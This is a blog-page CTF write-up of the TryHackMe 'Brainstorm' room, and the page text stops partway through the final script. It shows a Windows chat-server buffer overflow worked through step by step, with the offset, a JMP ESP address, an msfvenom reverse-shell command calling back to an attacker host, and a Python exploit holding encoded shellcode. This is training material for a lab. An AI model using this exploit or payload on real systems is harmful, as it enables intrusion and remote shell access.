<!DOCTYPE html>
<html
  lang="en"
  dir="ltr"
  class="scroll-smooth"
  data-default-appearance="dark"
  data-auto-appearance="true"
><head>
  <meta charset="utf-8" />
  
    <meta http-equiv="content-language" content="en" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  
  <title>TryhackMe -BrainStorm &middot; Trevor Saudi</title>
    <meta name="title" content="TryhackMe -BrainStorm &middot; Trevor Saudi" />
  
  <meta name="description" content="Portfolio/blog" />
  
  
  
  <link rel="canonical" href="https://trevorsaudi.com/posts/2021-03-28_tryhackme-brainstorm/" />
  
  
  
  
  
  
  
  
  
  
  <link
    type="text/css"
    rel="stylesheet"
    href="/css/main.bundle.min.8d6f934e50c42eacbf71529412d91ce34181ec8a6a1bc9a4b96d7d7ce8bba2a397de1562411d0617d3b4ae9b438986aa54aa4f9eb442653b947b28652ac88deb.css"
    integrity="sha512-jW&#43;TTlDELqy/cVKUEtkc40GB7IpqG8mkuW19fOi7oqOX3hViQR0GF9O0rptDiYaqVKpPnrRCZTuUeyhlKsiN6w=="
  />
  
  
  <script type="text/javascript" src="/js/appearance.min.4df8309499991be53c71b2b39ba0f5d5e77ea7d411d0710ce48c24218e7cc24ded28f19e85838fdc56db2306195cb001f049f577be0cf0ffb2dd6e2037ede1b9.js" integrity="sha512-TfgwlJmZG&#43;U8cbKzm6D11ed&#43;p9QR0HEM5IwkIY58wk3tKPGehYOP3FbbIwYZXLAB8En1d74M8P&#43;y3W4gN&#43;3huQ=="></script>
  
    
    
    
  
  
    
    
  
  
  
    
    <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.61ddd918b834d47011bb8923606e0c3814bbcec0f2d5ab743171ca58a52eea55eb74d2f5ea267d6398ccaf6cabb0360c61b93e541ed4892fddf757fd2d317822.js" integrity="sha512-Yd3ZGLg01HARu4kjYG4MOBS7zsDy1at0MXHKWKUu6lXrdNL16iZ9Y5jMr2yrsDYMYbk&#43;VB7UiS/d91f9LTF4Ig==" data-copy="Copy" data-copied="Copied"></script>
  
  
  
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
    <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  <meta property="og:title" content="TryhackMe -BrainStorm" />
<meta property="og:description" content="Reverse engineering a chat application to exploit a windows machine using a buffer overflow # Prerequisites #  Windows 7/10 virtual environment Immunity Debugger Basic understanding of buffer overflows  Enumeration # We Spin off the instance and get right into some enumeration." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://trevorsaudi.com/posts/2021-03-28_tryhackme-brainstorm/" /><meta property="og:image" content="https://trevorsaudi.com/posts/2021-03-28_tryhackme-brainstorm/images/1.jpeg" /><meta property="og:image" content="https://trevorsaudi.com/posts/2021-03-28_tryhackme-brainstorm/images/2.png" /><meta property="og:image" content="https://trevorsaudi.com/posts/2021-03-28_tryhackme-brainstorm/images/3.png" /><meta property="og:image" content="https://trevorsaudi.com/posts/2021-03-28_tryhackme-brainstorm/images/4.png" /><meta property="og:image" content="https://trevorsaudi.com/posts/2021-03-28_tryhackme-brainstorm/images/5.png" /><meta property="og:image" content="https://trevorsaudi.com/posts/2021-03-28_tryhackme-brainstorm/images/6.png" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-03-28T15:51:16+00:00" />
<meta property="article:modified_time" content="2022-05-24T14:31:29+03:00" /><meta property="og:site_name" content="Trevor Saudi" />


  <meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://trevorsaudi.com/posts/2021-03-28_tryhackme-brainstorm/images/1.jpeg"/>

<meta name="twitter:title" content="TryhackMe -BrainStorm"/>
<meta name="twitter:description" content="Reverse engineering a chat application to exploit a windows machine using a buffer overflow # Prerequisites #  Windows 7/10 virtual environment Immunity Debugger Basic understanding of buffer overflows  Enumeration # We Spin off the instance and get right into some enumeration."/>

  
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "TryhackMe -BrainStorm",
    "headline": "TryhackMe -BrainStorm",
    
    "abstract": "Reverse engineering a chat application to exploit a windows machine using a buffer overflow # Prerequisites #  Windows 7\/10 virtual environment Immunity Debugger Basic understanding of buffer overflows  Enumeration # We Spin off the instance and get right into some enumeration.",
    "inLanguage": "en",
    "url" : "https:\/\/trevorsaudi.com\/posts\/2021-03-28_tryhackme-brainstorm\/",
    "author" : {
      "@type": "Person",
      "name": "Trevor Saudi"
    },
    "copyrightYear": "2021",
    "dateCreated": "2021-03-28T15:51:16\u002b00:00",
    "datePublished": "2021-03-28T15:51:16\u002b00:00",
    
    "dateModified": "2022-05-24T14:31:29\u002b03:00",
    
    "keywords": ["Machine","BOF"],
    
    "mainEntityOfPage": "true",
    "wordCount": "1073"
  }]
  </script>


  
  <meta name="author" content="Trevor Saudi" />
  
    
      <link href="https://github.com/trevorsaudi" rel="me" />
    
  
  
  






  
  
  
  


  
  
</head>
<body
    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 bg-neutral text-neutral-900 sm:px-14 md:px-24 lg:px-32 dark:bg-neutral-800 dark:text-neutral max-w-7xl"
  >
    <div id="the-top" class="absolute flex self-center">
      <a
        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 dark:bg-neutral-600 focus:translate-y-0"
        href="#main-content"
        ><span class="font-bold ltr:pr-2 rtl:pl-2 text-primary-600 dark:text-primary-400"
          >&darr;</span
        >Skip to main content</a
      >
    </div><header
  class="flex justify-between py-6 font-semibold sm:items-center sm:py-10 text-neutral-900 dark:text-neutral print:hidden"
>
  
  <div>
    
      
    
    

  </div>
  
  
    <nav>
      <ul class="flex flex-col list-none sm:flex-row">
        
          <li
            class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"
          >
            <a
              class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
              href="/"
              title=""
              >Home</a
            >
          </li>
        
          <li
            class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"
          >
            <a
              class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
              href="/posts/"
              title="Posts"
              >Posts</a
            >
          </li>
        
          <li
            class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"
          >
            <a
              class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
              href="/about/"
              title=""
              >About</a
            >
          </li>
        
          <li
            class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"
          >
            <a
              class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
              href="/tags/"
              title="Tags"
              >Tags</a
            >
          </li>
        
        
          <li
            class="ltr:text-right rtl:text-left ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"
          >
            <button
              id="search-button"
              class="text-base hover:text-primary-600 dark:hover:text-primary-400"
              title="Search (/)"
            >
              

  <span class="relative inline-block align-text-bottom icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
          </li>
        
      </ul>
    </nav>
  
</header>
<div class="relative">
      <main id="main-content" class="grow">
  <article>
    <header class="max-w-prose">
      
        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
  
  
    
  
    
  
  <li class="inline hidden">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/"
      ></a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline ">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/posts/"
      >Posts</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline hidden">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/posts/2021-03-28_tryhackme-brainstorm/"
      >TryhackMe -BrainStorm</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

</ol>


      
      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        TryhackMe -BrainStorm
      </h1>
      <div class="mt-8 mb-12 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
        





  
  



  

  
  
    
  

  

  

  
    
  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2021-03-28 15:51:16.293 &#43;0000 UTC">28 March 2021</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">6 mins</span>
    

    
    
  </div>

  
  


      </div>
    </header>
    <section class="flex flex-col max-w-full mt-0 prose lg:flex-row dark:prose-invert">
      
        <div class="order-first px-0 lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8 lg:order-last">
          <div class="ltr:pl-5 rtl:pr-5 toc lg:sticky lg:top-10 print:hidden">
            <details open class="mt-0 overflow-hidden rounded-lg rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 lg:mt-3">
  <summary
    class="block py-1 text-lg font-semibold cursor-pointer rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 text-neutral-800 dark:text-neutral-100 lg:hidden bg-neutral-100 dark:bg-neutral-700"
  >
    Table of Contents
  </summary>
  <div
    class="py-2 border-dotted ltr:border-l rtl:border-r rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 border-neutral-300 dark:border-neutral-600"
  >
    <nav id="TableOfContents">
  <ul>
    <li><a href="#reverse-engineering-a-chat-application-to-exploit-a-windows-machine-using-a-buffer-overflow">Reverse engineering a chat application to exploit a windows machine using a buffer overflow</a>
      <ul>
        <li><a href="#prerequisites">Prerequisites</a></li>
        <li><a href="#enumeration">Enumeration</a>
          <ul>
            <li><a href="#testing-the-chat-server">Testing the chat server</a></li>
          </ul>
        </li>
        <li><a href="#exploitation">Exploitation</a>
          <ul>
            <li><a href="#fuzzing-with-python">Fuzzing with python</a></li>
            <li><a href="#finding-the-offset">Finding the offset</a></li>
            <li><a href="#controlling-the-eip">Controlling the EIP</a></li>
            <li><a href="#finding-a-jmp-esp">Finding a JMP ESP</a></li>
            <li><a href="#finding-bad-characters">Finding Bad characters</a></li>
            <li><a href="#generating-shellcode">Generating shellcode</a></li>
          </ul>
        </li>
        <li><a href="#getting-the-flag">Getting the flag</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</details>

          </div>
        </div>
      
      <div class="min-w-0 min-h-0 max-w-prose">
        <p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2021-03-28_tryhackme-brainstorm/images/1.jpeg#layoutTextWidth" alt="image" />
      
    </figure>
  

</p>
<h2 id="reverse-engineering-a-chat-application-to-exploit-a-windows-machine-using-a-buffer-overflow" class="relative group">Reverse engineering a chat application to exploit a windows machine using a buffer overflow <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#reverse-engineering-a-chat-application-to-exploit-a-windows-machine-using-a-buffer-overflow" aria-label="Anchor">#</a></span></h2>
<h3 id="prerequisites" class="relative group">Prerequisites <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#prerequisites" aria-label="Anchor">#</a></span></h3>
<ol>
<li>Windows 7/10 virtual environment</li>
<li>Immunity Debugger</li>
<li>Basic understanding of buffer overflows</li>
</ol>
<h3 id="enumeration" class="relative group">Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#enumeration" aria-label="Anchor">#</a></span></h3>
<p>We Spin off the instance and get right into some enumeration. We can begin with some nmap or rustscan scanning to identify open ports</p>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2021-03-28_tryhackme-brainstorm/images/2.png#layoutTextWidth" alt="image" />
      
    </figure>
  

</p>
<p>FTP with anonymous login, RDP and a service running on port 9999. This seems to be a windows machine.</p>
<p>We can start off by anonymously accessing the FTP server
<code>ftp &lt;;IP&gt;;</code></p>
<p>Enter username and password as <code>anonymous</code></p>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2021-03-28_tryhackme-brainstorm/images/3.png#layoutTextWidth" alt="image" />
      
    </figure>
  

</p>
<p>We can enumerate for directories and files using <code>ls </code>and <code>cd</code> . Inside the chatserver directory we get an executable and a dll file.</p>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2021-03-28_tryhackme-brainstorm/images/4.png#layoutTextWidth" alt="image" />
      
    </figure>
  

</p>
<p>Let‚Äôs save those to our local machine using <code>get</code> command.</p>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2021-03-28_tryhackme-brainstorm/images/5.png#layoutTextWidth" alt="image" />
      
    </figure>
  

</p>
<h4 id="testing-the-chat-server" class="relative group">Testing the chat server <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#testing-the-chat-server" aria-label="Anchor">#</a></span></h4>
<p>Okay, now we have some info from from ftp. Let‚Äôs access the service at port 9999. It is a chat server that asks for your username and a message. The username is constrained to 20 characters. The program running is the executable we got from ftp</p>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2021-03-28_tryhackme-brainstorm/images/6.png#layoutTextWidth" alt="image" />
      
    </figure>
  

</p>
<h3 id="exploitation" class="relative group">Exploitation <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#exploitation" aria-label="Anchor">#</a></span></h3>
<p>For the exploitation phase, I will take you through writing a python exploit for a buffer overflow vulnerability to gain shell access on the windows machine.</p>
<p>The chat application asks us for a username of 20 characters, what if we supplied one of more than 20 characters? Let us see if we can trigger a crash in the application.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&#34;print(‚ÄòA‚Äô*100)&#34;</span>
</code></pre></div><p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2021-03-28_tryhackme-brainstorm/images/7.png#layoutTextWidth" alt="image" />
      
    </figure>
  

</p>
<p>Supply the 100 As as username and message. We don‚Äôt get a crash. Let us try 3000 As. The chat server crashes. This confirms existence of a buffer overflow on the message parameter since username filters out the remaining bytes.</p>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2021-03-28_tryhackme-brainstorm/images/8.png#layoutTextWidth" alt="image" />
      
    </figure>
  

</p>
<h4 id="fuzzing-with-python" class="relative group">Fuzzing with python <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#fuzzing-with-python" aria-label="Anchor">#</a></span></h4>
<p>To inspect the crash, we need to work with chatserver.exe in our windows lab environment. We attach the executable to Immunity debugger as follows</p>
<p><code>File &gt;; Open &gt;; path_to_chatserver.exe</code></p>
<p>Run it by pressing the play button or F5 key.</p>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2021-03-28_tryhackme-brainstorm/images/9.png#layoutTextWidth" alt="image" />
      
    </figure>
  

</p>
<p>Let us test if we can reach the chatserver from our local machine</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nc -nv &lt;<span class="p">;</span>windows IP&gt;<span class="p">;</span> <span class="m">9999</span>
</code></pre></div><p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2021-03-28_tryhackme-brainstorm/images/10.png#layoutTextWidth" alt="image" />
      
    </figure>
  

</p>
<p>We can now write a python fuzzing script to confirm the crash. Run the script and check Immunity debugger, once it crashes, kill the script.</p>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2021-03-28_tryhackme-brainstorm/images/11.png#layoutTextWidth" alt="image" />
      
    </figure>
  

</p>
<p>The program crashes, confirming we have overflown the buffer space and overwritten the EIP with ‚Äú41414141‚Äù which is ascii values for AAAAA</p>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2021-03-28_tryhackme-brainstorm/images/12.png#layoutTextWidth" alt="image" />
      
    </figure>
  

</p>
<h4 id="finding-the-offset" class="relative group">Finding the offset <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#finding-the-offset" aria-label="Anchor">#</a></span></h4>
<p>We sent a bunch of As to the server, it crashed. So now we need to figure out the size of the buffer before the EIP (the offset).</p>
<p>On immunity debugger, right click the ESP &gt;; follow dump. Check the hex value for where the A starts and ends</p>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2021-03-28_tryhackme-brainstorm/images/13.png#layoutTextWidth" alt="image" />
      
    </figure>
  

</p>
<p>Subtract to get the size of the buffer we sent. We then create a pattern of different ascii values using metasploit module and send that as the buffer</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">/usr/bin/msf-pattern_create -l <span class="m">4088</span>
</code></pre></div><p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2021-03-28_tryhackme-brainstorm/images/14.png#layoutTextWidth" alt="image" />
      
    </figure>
  

</p>
<p>We get the crash in Immunity Debugger</p>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2021-03-28_tryhackme-brainstorm/images/15.png#layoutTextWidth" alt="image" />
      
    </figure>
  

</p>
<p>The value that overwrites the EIP is different from when we sent a bunch of As, this can help us determine where this value occurs within the buffer we sent. Copy the value and find the offset</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">/usr/bin/msf-pattern_offset -l <span class="m">4088</span> -q <span class="m">31704330</span>
</code></pre></div><p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2021-03-28_tryhackme-brainstorm/images/16.png#layoutTextWidth" alt="image" />
      
    </figure>
  

</p>
<p>So now we know we have exactly 2012 bytes before we reach the EIP</p>
<h4 id="controlling-the-eip" class="relative group">Controlling the EIP <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#controlling-the-eip" aria-label="Anchor">#</a></span></h4>
<p>Now we modify our script as follows</p>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2021-03-28_tryhackme-brainstorm/images/17.png#layoutTextWidth" alt="image" />
      
    </figure>
  

</p>
<p>We send 4 Bs immediately after the 2012 As to confirm if we can take control of the EIP. We get 42424242 as the EIP showing that we have overwritten the EIP with the 4 Bs.</p>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2021-03-28_tryhackme-brainstorm/images/18.png#layoutTextWidth" alt="image" />
      
    </figure>
  

</p>
<h4 id="finding-a-jmp-esp" class="relative group">Finding a JMP ESP <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#finding-a-jmp-esp" aria-label="Anchor">#</a></span></h4>
<p>We need to locate a JMP ESP instruction in memory that we will use to redirect the control flow of the program to the stack. The address of the JMP ESP is placed in the EIP.</p>
<p>We can use the awesome mona python script to find the instruction</p>
<p><a href="https://github.com/corelan/mona">corelan/mona</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">!mona jmp -r esp
</code></pre></div><p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2021-03-28_tryhackme-brainstorm/images/19.png#layoutTextWidth" alt="image" />
      
    </figure>
  

</p>
<p>Copy the address of one of the results and then modify your python script. We add the new_eip variable immediately after our buffer to overwrite the EIP and jump to the top of the stack.</p>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2021-03-28_tryhackme-brainstorm/images/20.png#layoutTextWidth" alt="image" />
      
    </figure>
  

</p>
<p>To verify we are indeed hitting the jump esp instruction, set a break point in Immunity debugger as follows.</p>
<p>Ctrl+G then paste the address of the jmp esp instruction. Press F2 to set breakpoint.</p>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2021-03-28_tryhackme-brainstorm/images/21.png#layoutTextWidth" alt="image" />
      
    </figure>
  

</p>
<p>Send the payload. We indeed hit the breakpoint</p>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2021-03-28_tryhackme-brainstorm/images/22.png#layoutTextWidth" alt="image" />
      
    </figure>
  

</p>
<h4 id="finding-bad-characters" class="relative group">Finding Bad characters <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#finding-bad-characters" aria-label="Anchor">#</a></span></h4>
<p>Since now we know that we control the EIP. Before we generate our shellcode, we need to find what bad characters might create problems in the execution of our shellcode, because the application won‚Äôt process those characters. Generally, the null byte (\x00), the line feed (\x0A) and the carriage return (\x0D) are bad characters.</p>
<p>We can modify our script as follows to send the ascii characters into the stack and confirm in the hex dump if they all display correctly</p>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2021-03-28_tryhackme-brainstorm/images/23.png#layoutTextWidth" alt="image" />
      
    </figure>
  

</p>
<p>We don‚Äôt get bad characters in the hex dump.</p>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2021-03-28_tryhackme-brainstorm/images/24.png#layoutTextWidth" alt="image" />
      
    </figure>
  

</p>
<h4 id="generating-shellcode" class="relative group">Generating shellcode <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#generating-shellcode" aria-label="Anchor">#</a></span></h4>
<p>Since we are dealing with a windows executable, generate a shellcode specific to that using msfvenom</p>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2021-03-28_tryhackme-brainstorm/images/25.png#layoutTextWidth" alt="image" />
      
    </figure>
  

</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msfvenom -p windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.0.103 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -e x86/shikata_ga_nai -f py -b <span class="s2">&#34;\x00&#34;</span>
</code></pre></div><p>Copy the shellcode into our program. Our final script looks as follows</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">struct</span>
<span class="n">IP</span> <span class="o">=</span> <span class="s2">&#34;192.168.0.104&#34;</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="mi">9999</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">IP</span><span class="p">,</span><span class="n">PORT</span><span class="p">))</span>
<span class="n">username</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;SAUDI&#34;</span>
<span class="n">new_eip</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;I&#34;</span><span class="p">,</span><span class="mh">0x62501503</span><span class="p">)</span>
<span class="n">badchars</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;B&#34;</span><span class="p">,</span><span class="n">x</span><span class="p">)</span><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">256</span><span class="p">)])</span>
<span class="n">buf</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&#34;&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbd\xaf\x88\xc7\xb6\xdb\xd5\xd9\x74\x24\xf4\x5e\x2b</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xc9\xb1\x52\x31\x6e\x12\x83\xc6\x04\x03\xc1\x86\x25</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x43\xe1\x7f\x2b\xac\x19\x80\x4c\x24\xfc\xb1\x4c\x52</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x75\xe1\x7c\x10\xdb\x0e\xf6\x74\xcf\x85\x7a\x51\xe0</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x2e\x30\x87\xcf\xaf\x69\xfb\x4e\x2c\x70\x28\xb0\x0d</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbb\x3d\xb1\x4a\xa6\xcc\xe3\x03\xac\x63\x13\x27\xf8</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbf\x98\x7b\xec\xc7\x7d\xcb\x0f\xe9\xd0\x47\x56\x29</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xd3\x84\xe2\x60\xcb\xc9\xcf\x3b\x60\x39\xbb\xbd\xa0</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x73\x44\x11\x8d\xbb\xb7\x6b\xca\x7c\x28\x1e\x22\x7f</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xd5\x19\xf1\xfd\x01\xaf\xe1\xa6\xc2\x17\xcd\x57\x06</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xc1\x86\x54\xe3\x85\xc0\x78\xf2\x4a\x7b\x84\x7f\x6d</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xab\x0c\x3b\x4a\x6f\x54\x9f\xf3\x36\x30\x4e\x0b\x28</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x9b\x2f\xa9\x23\x36\x3b\xc0\x6e\x5f\x88\xe9\x90\x9f</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x86\x7a\xe3\xad\x09\xd1\x6b\x9e\xc2\xff\x6c\xe1\xf8</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xb8\xe2\x1c\x03\xb9\x2b\xdb\x57\xe9\x43\xca\xd7\x62</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x93\xf3\x0d\x24\xc3\x5b\xfe\x85\xb3\x1b\xae\x6d\xd9</span><span class="s2">&#34;</span>
